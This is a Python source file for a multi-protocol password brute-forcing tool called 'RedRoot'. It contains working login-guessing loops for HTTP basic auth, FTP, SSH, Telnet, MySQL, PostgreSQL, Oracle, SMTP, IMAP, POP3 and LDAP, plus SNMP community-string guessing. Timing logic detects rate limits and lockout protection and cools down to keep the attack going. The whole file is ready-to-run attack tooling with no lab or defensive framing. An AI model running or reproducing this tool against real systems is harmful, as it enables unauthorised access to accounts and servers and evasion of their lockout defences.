#!/usr/bin/env python3
# bruteforce.py - RedRoot Universal Brute-force Tool

import os, time, logging
from rich.console import Console
from rich.text import Text

import ftplib, paramiko, requests, pymysql, smtplib
import imaplib, poplib, psycopg2, cx_Oracle, pexpect
from ldap3 import Server, Connection, ALL
from pysnmp.hlapi import *

# Silence Paramiko noise
logging.getLogger("paramiko.transport").setLevel(logging.CRITICAL)
logging.getLogger("paramiko").setLevel(logging.CRITICAL)

console = Console()

# ================= UI =================

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def animate_typing_banner():
    clear()
    msg = "Welcome Mr. Agampreet"
    colors = ["red", "gold1"]
    text = Text()
    for i, ch in enumerate(msg):
        text.append(ch, style=f"bold {colors[i % 2]}")
        console.print(text, end="\r")
        time.sleep(0.02)
    console.print("\n")

def load_list(path):
    if not path:
        return []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [x.strip() for x in f if x.strip()]
    except FileNotFoundError:
        console.print(f"[!] File not found: {path}", style="bold red")
        return []

def log_result(success, service, user, pwd):
    tag = "[+]" if success else "[-]"
    color = "green" if success else "red"
    console.print(
        f"{tag} {service} {'Success' if success else 'Fail'}: "
        f"[bold yellow]{user}[/bold yellow]:[bold yellow]{pwd}[/bold yellow]",
        style=f"bold {color}"
    )

# ================= Timing Logic =================

def smart_delay(service, level="normal"):
    delays = {
        "ssh": {"normal": 1, "soft": 5, "hard": 60},
        "ftp": {"normal": 1, "soft": 3, "hard": 30},
        "smtp": {"normal": 2, "soft": 5, "hard": 30},
        "imap": {"normal": 2, "soft": 5, "hard": 30},
        "pop3": {"normal": 2, "soft": 5, "hard": 30},
        "http": {"normal": 0.5, "soft": 3, "hard": 10},
        "mysql": {"normal": 0.5},
        "postgresql": {"normal": 0.5},
        "oracle": {"normal": 1},
        "ldap": {"normal": 2, "hard": 30},
        "telnet": {"normal": 2, "hard": 20},
    }
    time.sleep(delays.get(service, {}).get(level, 1))

# ================= Brute Modules =================

def brute_http_basic(url, users, passwords):
    for u in users:
        for p in passwords:
            try:
                r = requests.get(url, auth=(u, p), timeout=5)
                if r.status_code == 200:
                    log_result(True, "HTTP", u, p)
                    return u, p
                log_result(False, "HTTP", u, p)
                if r.status_code in (403, 429):
                    console.print("[!] HTTP rate limit detected", style="bold yellow")
                    smart_delay("http", "hard")
                else:
                    smart_delay("http")
            except:
                smart_delay("http", "soft")
    return None

def brute_ftp(host, port, users, passwords):
    fails = 0
    for u in users:
        for p in passwords:
            try:
                ftp = ftplib.FTP()
                ftp.connect(host, port, timeout=5)
                ftp.login(u, p)
                log_result(True, "FTP", u, p)
                ftp.quit()
                return u, p
            except ftplib.error_perm:
                log_result(False, "FTP", u, p)
                fails += 1
                smart_delay("ftp")
            except:
                fails += 1
                if fails >= 5:
                    console.print("[!] FTP protection suspected", style="bold yellow")
                    smart_delay("ftp", "hard")
                    fails = 0
                else:
                    smart_delay("ftp", "soft")
    return None

def brute_ssh(host, port, users, passwords):
    banner_fail = 0
    for u in users:
        for p in passwords:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(
                    host, port=port, username=u, password=p,
                    timeout=5, banner_timeout=10, auth_timeout=5,
                    look_for_keys=False, allow_agent=False
                )
                log_result(True, "SSH", u, p)
                ssh.close()
                return u, p
            except paramiko.AuthenticationException:
                log_result(False, "SSH", u, p)
                banner_fail = 0
                smart_delay("ssh")
            except paramiko.SSHException:
                banner_fail += 1
                if banner_fail >= 3:
                    console.print("[!] SSH protection detected. Cooling down...", style="bold yellow")
                    smart_delay("ssh", "hard")
                    banner_fail = 0
                else:
                    smart_delay("ssh", "soft")
            except:
                smart_delay("ssh", "soft")
            finally:
                try:
                    ssh.close()
                except:
                    pass
    return None

def brute_telnet(host, port, users, passwords):
    for u in users:
        for p in passwords:
            try:
                child = pexpect.spawn(f"telnet {host} {port}", timeout=8)
                child.expect(["login:", "Login:"], timeout=6)
                child.sendline(u)
                child.expect(["Password:", "password:"], timeout=6)
                child.sendline(p)
                i = child.expect(["#", r"\$", "Login incorrect", pexpect.TIMEOUT], timeout=6)
                ok = i in [0, 1]
                log_result(ok, "Telnet", u, p)
                child.close()
                if ok:
                    return u, p
                smart_delay("telnet")
            except:
                smart_delay("telnet", "hard")
    return None

def brute_mysql(host, port, users, passwords):
    for u in users:
        for p in passwords:
            try:
                conn = pymysql.connect(host=host, port=port, user=u, password=p, connect_timeout=5)
                log_result(True, "MySQL", u, p)
                conn.close()
                return u, p
            except pymysql.err.OperationalError:
                log_result(False, "MySQL", u, p)
                smart_delay("mysql")
    return None

def brute_postgresql(host, port, users, passwords):
    for u in users:
        for p in passwords:
            try:
                conn = psycopg2.connect(host=host, port=port, user=u, password=p, connect_timeout=5)
                log_result(True, "PostgreSQL", u, p)
                conn.close()
                return u, p
            except psycopg2.OperationalError:
                log_result(False, "PostgreSQL", u, p)
                smart_delay("postgresql")
    return None

def brute_oracle(host, port, users, passwords):
    dsn = cx_Oracle.makedsn(host, port, service_name="ORCL")
    for u in users:
        for p in passwords:
            try:
                conn = cx_Oracle.connect(u, p, dsn)
                log_result(True, "Oracle", u, p)
                conn.close()
                return u, p
            except cx_Oracle.DatabaseError:
                log_result(False, "Oracle", u, p)
                smart_delay("oracle")
    return None

def brute_smtp(host, port, users, passwords):
    fails = 0
    for u in users:
        for p in passwords:
            try:
                s = smtplib.SMTP(host, port, timeout=5)
                s.starttls()
                s.login(u, p)
                log_result(True, "SMTP", u, p)
                s.quit()
                return u, p
            except smtplib.SMTPAuthenticationError:
                log_result(False, "SMTP", u, p)
                fails += 1
                smart_delay("smtp")
            except:
                fails += 1
                if fails >= 4:
                    console.print("[!] SMTP rate limit detected", style="bold yellow")
                    smart_delay("smtp", "hard")
                    fails = 0
    return None

def brute_imap(host, port, users, passwords):
    for u in users:
        for p in passwords:
            try:
                c = imaplib.IMAP4_SSL(host, port)
                c.login(u, p)
                log_result(True, "IMAP", u, p)
                c.logout()
                return u, p
            except:
                log_result(False, "IMAP", u, p)
                smart_delay("imap")
    return None

def brute_pop3(host, port, users, passwords):
    for u in users:
        for p in passwords:
            try:
                c = poplib.POP3_SSL(host, port, timeout=5)
                c.user(u)
                c.pass_(p)
                log_result(True, "POP3", u, p)
                c.quit()
                return u, p
            except:
                log_result(False, "POP3", u, p)
                smart_delay("pop3")
    return None

def brute_ldap(host, port, users, passwords):
    server = Server(host, port=port, get_info=ALL)
    for u in users:
        for p in passwords:
            try:
                conn = Connection(server, user=u, password=p)
                if conn.bind():
                    log_result(True, "LDAP", u, p)
                    conn.unbind()
                    return u, p
                log_result(False, "LDAP", u, p)
                smart_delay("ldap")
            except:
                smart_delay("ldap", "hard")
    return None

def brute_snmp(host, communities):
    for c in communities:
        iterator = getCmd(
            SnmpEngine(),
            CommunityData(c, mpModel=0),
            UdpTransportTarget((host, 161)),
            ContextData(),
            ObjectType(ObjectIdentity("1.3.6.1.2.1.1.1.0"))
        )
        try:
            err, stat, _, _ = next(iterator)
            if not err and not stat:
                console.print(f"[+] SNMP Success: {c}", style="bold green")
                return c
            console.print(f"[-] SNMP Fail: {c}", style="bold red")
        except:
            pass
    return None

# ================= Runner =================

def run_bruteforce(args):
    animate_typing_banner()
    service = args.service.lower()

    if service == "snmp":
        comms = load_list(args.passwords)
        brute_snmp(args.target, comms)
        return

    users = load_list(args.users)
    passwords = load_list(args.passwords)

    match service:
        case "http": res = brute_http_basic(args.url, users, passwords)
        case "ftp": res = brute_ftp(args.target, args.port or 21, users, passwords)
        case "ssh": res = brute_ssh(args.target, args.port or 22, users, passwords)
        case "telnet": res = brute_telnet(args.target, args.port or 23, users, passwords)
        case "mysql": res = brute_mysql(args.target, args.port or 3306, users, passwords)
        case "postgresql" | "postgres": res = brute_postgresql(args.target, args.port or 5432, users, passwords)
        case "oracle": res = brute_oracle(args.target, args.port or 1521, users, passwords)
        case "smtp": res = brute_smtp(args.target, args.port or 587, users, passwords)
        case "imap": res = brute_imap(args.target, args.port or 993, users, passwords)
        case "pop3": res = brute_pop3(args.target, args.port or 995, users, passwords)
        case "ldap": res = brute_ldap(args.target, args.port or 389, users, passwords)
        case _: 
            console.print("[-] Unsupported service", style="bold red")
            return

    if res:
        console.print(f"[+] Valid credentials found: {res}", style="bold green")
    else:
        console.print("[!] No valid credentials found", style="bold red")
